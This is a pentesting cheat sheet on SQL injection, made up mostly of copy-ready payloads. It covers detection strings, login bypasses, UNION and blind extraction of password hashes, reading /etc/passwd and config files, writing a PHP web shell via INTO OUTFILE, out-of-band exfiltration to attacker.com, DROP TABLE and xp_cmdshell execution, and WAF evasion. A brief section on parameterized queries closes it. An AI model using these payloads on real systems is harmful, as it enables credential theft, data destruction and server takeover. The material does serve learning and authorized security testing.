# SQLI

### Overview

**SQL Injection** is a critical web security vulnerability that allows attackers to interfere with database queries. By injecting malicious SQL code into application inputs, attackers can view, modify, or delete data, bypass authentication, and potentially execute commands on the underlying operating system.

**Why it's critical:**

* Direct database access
* Complete data breach potential
* Authentication bypass
* Remote code execution possible
* Often leads to full system compromise

**Common vulnerable inputs:**

* Login forms
* Search boxes
* URL parameters
* HTTP headers
* JSON/XML inputs
* Cookie values

**Impact:**

* Data theft (credentials, PII, financial data)
* Authentication bypass
* Data modification/deletion
* Denial of service
* Complete server takeover
* Lateral movement to other systems

***

### Exploitation Workflow Summary

```
1. Discovery & Detection
   ├─ Identify injection points
   ├─ Test with error-generating payloads
   ├─ Confirm SQL execution
   └─ Fingerprint database type

2. Vulnerability Classification
   ├─ In-band (Union-based, Error-based)
   ├─ Blind (Boolean-based, Time-based)
   ├─ Out-of-band
   └─ Second-order injection

3. Information Gathering
   ├─ Database version and type
   ├─ Current database name
   ├─ Table enumeration
   └─ Column enumeration

4. Data Extraction
   ├─ Extract sensitive data
   ├─ Dump user credentials
   ├─ Read system files
   └─ Enumerate database structure

5. Advanced Exploitation
   ├─ File system access
   ├─ Command execution
   ├─ Privilege escalation
   └─ Post-exploitation
```

***

### Understanding SQL Injection

#### How It Works

**Vulnerable PHP code:**

```php
$searchInput = $_POST['findUser'];
$query = "SELECT * FROM logins WHERE username LIKE '%$searchInput'";
$result = $conn->query($query);
```

**Normal query:**

```sql
SELECT * FROM logins WHERE username LIKE '%john'
```

**Malicious input:**

```
admin' OR '1'='1
```

**Resulting query:**

```sql
SELECT * FROM logins WHERE username LIKE '%admin' OR '1'='1'
```

**Result:** Returns all users (authentication bypass)

***

### Detection Techniques

#### Basic Detection Payloads

**Single quote test:**

```
'
''
'''
```

**Expected responses:**

* Error message (vulnerable)
* Different behavior (vulnerable)
* No change (potentially not vulnerable)

**Common error messages:**

```
You have an error in your SQL syntax
Unclosed quotation mark
SQLSTATE[42000]
Warning: mysql_fetch_array()
```

#### Universal Detection Payloads

```
' OR '1'='1
' OR 1=1--
" OR "1"="1
' OR 'a'='a
') OR ('1'='1
```

**Numeric contexts:**

```
1 OR 1=1
1' OR '1'='1
1 AND 1=2
```

#### Polyglot Detection

**Universal payload:**

```
' OR '1'='1'-- -
```

**Advanced polyglot:**

```
&1/*'/*"/**/||1#\
and-1/*'/*"/**/||1--+\
```

***

### Authentication Bypass

#### Username Field

**Basic bypass:**

```
admin'--
admin'#
admin')--
administrator'--
```

**Why it works:**

```sql
-- Original
SELECT * FROM users WHERE username='admin'--' AND password='something'

-- Query executed
SELECT * FROM users WHERE username='admin'
```

**Universal bypass attempts:**

```
' OR '1'='1
' OR 1=1--
admin' OR '1'='1'--
' OR 'x'='x
') OR ('a'='a
```

#### Password Field

**When username is known:**

```
Username: admin
Password: ' OR '1'='1
```

**Resulting query:**

```sql
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
```

***

### Union-Based SQL Injection

#### Understanding UNION

**UNION combines results from multiple SELECT statements:**

```sql
SELECT column1 FROM table1
UNION
SELECT column2 FROM table2
```

**Requirements:**

* Same number of columns
* Compatible data types

#### Step 1: Determine Column Count

**Using ORDER BY:**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

**Continue until error occurs**

**Example:**

```
' ORDER BY 5--  → Error
```

**Conclusion:** Table has 4 columns

**Using NULL:**

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
```

#### Step 2: Find Visible Columns

**Test which columns display:**

```sql
' UNION SELECT 1,2,3,4--
```

**Output shows:** `2` and `3` are displayed

**Inject in visible column:**

```sql
' UNION SELECT 1,@@version,database(),4--
```

#### Step 3: Database Enumeration

**List all databases:**

```sql
' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata--
```

**List tables:**

```sql
' UNION SELECT 1,table_name,table_schema,4 FROM information_schema.tables--
```

**List columns:**

```sql
' UNION SELECT 1,column_name,table_name,4 FROM information_schema.columns WHERE table_name='users'--
```

#### Step 4: Data Extraction

**Extract user data:**

```sql
' UNION SELECT 1,username,password,4 FROM users--
```

**Concatenate multiple columns:**

```sql
' UNION SELECT 1,CONCAT(username,':',password),3,4 FROM users--
```

**MySQL:**

```sql
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM users--
```

**Oracle:**

```sql
' UNION SELECT 1,username||'~'||password,3,4 FROM users--
```

***

### Blind SQL Injection

#### Boolean-Based

**Concept:** Application behavior changes based on TRUE/FALSE

**Test for vulnerability:**

```sql
' AND 1=1--   (TRUE - normal response)
' AND 1=2--   (FALSE - different response)
```

**Extract data character by character:**

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

**Response:**

* TRUE → First character is 'a'
* FALSE → Try next character

**Complete extraction:**

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--  (FALSE)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--  (FALSE)
...
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='m'--  (TRUE)
```

**Burp Intruder position:**

```
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='§a§'--
```

**Payload:** `a-z0-9`

#### Time-Based

**Concept:** Inject time delays to confirm SQL execution

**MySQL:**

```sql
' AND SLEEP(5)--
' OR SLEEP(5)--
```

**PostgreSQL:**

```sql
' || pg_sleep(5)--
```

**Microsoft SQL:**

```sql
'; WAITFOR DELAY '00:00:05'--
```

**Oracle:**

```sql
' || DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

**Extract data:**

```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
```

**Response time:**

* 5+ seconds → Character is 'a'
* Immediate → Try next character

**PostgreSQL extraction:**

```sql
' || CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

***

### Database Fingerprinting

#### Version Detection

**MySQL:**

```sql
' UNION SELECT @@version--
```

**PostgreSQL:**

```sql
' UNION SELECT version()--
```

**Microsoft SQL:**

```sql
' UNION SELECT @@version--
```

**Oracle:**

```sql
' UNION SELECT banner FROM v$version--
```

#### Database-Specific Functions

**MySQL:**

```sql
SELECT POW(1,1)  → Returns 1
SELECT SLEEP(1)  → Delays 1 second
```

**PostgreSQL:**

```sql
SELECT 1::int  → Returns 1
SELECT pg_sleep(1)  → Delays 1 second
```

**Oracle:**

```sql
SELECT * FROM dual  → Works only in Oracle
```

***

### Error-Based SQL Injection

#### Conditional Errors

**Concept:** Trigger errors only when condition is TRUE

**MySQL:**

```sql
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--
```

**Extract data:**

```sql
' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a') THEN 1/0 ELSE 'a' END)='a'--
```

**Oracle:**

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'--
```

**Password extraction:**

```sql
' || (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin')||'--
```

#### Type Conversion Errors

**Force type conversion to reveal data:**

```sql
' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
```

**Error reveals data:**

```
ERROR: invalid input syntax for type integer: "administrator"
```

**Extract password:**

```sql
' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
```

***

### Reading Files

#### MySQL LOAD\_FILE

**Check privileges:**

```sql
SELECT file_priv FROM mysql.user WHERE user='current_user'
```

**Read /etc/passwd:**

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4--
```

**Read web files:**

```sql
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),2,3,4--
```

**Obfuscated (bypass filters):**

```sql
' UNION SELECT LOAD_FILE(0x2f6574632f706173737764),2,3,4--
```

#### PostgreSQL

**Read files:**

```sql
' UNION SELECT pg_read_file('/etc/passwd',0,10000),2,3,4--
```

#### Microsoft SQL

**Read files:**

```sql
' UNION SELECT BulkColumn FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB)--
```

***

### Writing Files

#### MySQL INTO OUTFILE

**Check secure\_file\_priv:**

```sql
SELECT @@secure_file_priv
```

**Empty = can write anywhere**

**Write web shell:**

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3,4 INTO OUTFILE '/var/www/html/shell.php'--
```

**Access shell:**

```
http://target.com/shell.php?cmd=whoami
```

**Complete example:**

```sql
' UNION SELECT "","",'<?php system($_REQUEST[0]); ?>',""  INTO OUTFILE '/var/www/html/shell.php'--
```

#### Finding Web Root

**Common Linux locations:**

```
/var/www/html
/usr/share/nginx/html
/var/www
/home/user/public_html
```

**Common Windows locations:**

```
C:\inetpub\wwwroot
C:\xampp\htdocs
C:\wamp\www
```

***

### Bypass Techniques

#### Comment Syntax

**MySQL:**

```
-- (space required)
#
/**/
```

**Example:**

```sql
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
```

#### Space Bypass

**Alternative whitespace:**

```sql
%09 (tab)
%0A (newline)
%0D (carriage return)
%0C (form feed)
%0B (vertical tab)
```

**Example:**

```sql
'%09OR%09'1'='1
'%0AOR%0A'1'='1
```

**Using comments:**

```sql
'/**/OR/**/1=1--
'/*comment*/OR/**/1=1--
```

**Using parentheses:**

```sql
'OR(1)=(1)--
')OR('1')=('1
```

#### Keyword Bypass

**Case manipulation:**

```sql
' Or '1'='1
' oR '1'='1
' OR '1'='1
```

**Inline comments:**

```sql
' /*!OR*/ '1'='1
' /*! OR */ '1'='1
```

**Alternative operators:**

```sql
AND  → &&
OR   → ||
=    → LIKE
```

#### WAF Bypass Techniques

**Encoding:**

```sql
' UNION SELECT  → ' %55NION %53ELECT
```

**Double encoding:**

```sql
%2527  →  %27  →  '
```

**Hex encoding:**

```sql
' OR 1=1  → 0x27204f52203d31
```

**Mixed case with comments:**

```sql
' UnIoN/**/SeLeCt 1,2,3--
```

***

### Advanced Exploitation

#### Second-Order SQL Injection

**Concept:** Injection stored, executed later

**Example:**

```
Step 1: Register with username: admin'--
Step 2: System stores: admin'--
Step 3: Later query uses stored value
Step 4: SQL injection executes
```

#### Out-of-Band (OOB)

**DNS exfiltration (MySQL):**

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\share'))--
```

**HTTP requests:**

```sql
' UNION SELECT http_get('http://attacker.com/?data='||password) FROM users--
```

#### Stacked Queries

**Execute multiple statements:**

```sql
'; DROP TABLE users--
'; INSERT INTO admins VALUES ('attacker','pass')--
```

**Microsoft SQL:**

```sql
'; EXEC xp_cmdshell('whoami')--
```

***

### Time-Based Blind Techniques

#### Optimized Extraction

**Binary search approach:**

```sql
-- Is character > 'm'?
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>109,SLEEP(5),0)--
```

**Reduces attempts from 36 to \~6 per character**

#### Increasing Delay for Confidence

**Confirm vulnerability:**

```sql
' AND SLEEP(5)--   (5 seconds)
' AND SLEEP(10)--  (10 seconds)
' AND SLEEP(20)--  (20 seconds)
```

**If delays match, confirmed vulnerable**

***

### Database-Specific Techniques

#### MySQL

**Current user:**

```sql
SELECT USER()
SELECT CURRENT_USER()
```

**List databases:**

```sql
SELECT schema_name FROM information_schema.schemata
```

**List tables:**

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
```

#### PostgreSQL

**Current user:**

```sql
SELECT current_user
```

**List databases:**

```sql
SELECT datname FROM pg_database
```

**List tables:**

```sql
SELECT tablename FROM pg_tables WHERE schemaname='public'
```

#### Microsoft SQL

**Current user:**

```sql
SELECT SYSTEM_USER
SELECT USER_NAME()
```

**List databases:**

```sql
SELECT name FROM sys.databases
```

**Command execution:**

```sql
EXEC xp_cmdshell 'whoami'
```

#### Oracle

**Current user:**

```sql
SELECT user FROM dual
```

**List tables:**

```sql
SELECT table_name FROM all_tables
```

**All privileges:**

```sql
SELECT * FROM session_privs
```

***

### Defense & Prevention

**Parameterized queries (prepared statements):**

```php
// Bad - Vulnerable
$query = "SELECT * FROM users WHERE username = '$username'";

// Good - Safe
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

**Input validation:**

* Whitelist allowed characters
* Validate data types
* Limit input length
* Reject SQL keywords in input

**Principle of least privilege:**

* Database user has minimal permissions
* Separate read/write accounts
* Disable dangerous functions (xp\_cmdshell, LOAD\_FILE)

**WAF (Web Application Firewall):**

* ModSecurity rules
* Cloud WAF (Cloudflare, AWS WAF)
* Regular expression filtering

***

### Quick Reference

#### Detection

```sql
'
"
' OR '1'='1
1' ORDER BY 1--
```

#### Union-Based

```sql
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
```

#### Blind Boolean

```sql
' AND 1=1--  (TRUE)
' AND 1=2--  (FALSE)
```

#### Time-Based

```sql
' AND SLEEP(5)--  (MySQL)
' || pg_sleep(5)--  (PostgreSQL)
'; WAITFOR DELAY '00:00:05'--  (MSSQL)
```

#### Authentication Bypass

```sql
admin'--
' OR '1'='1
') OR ('1'='1
```



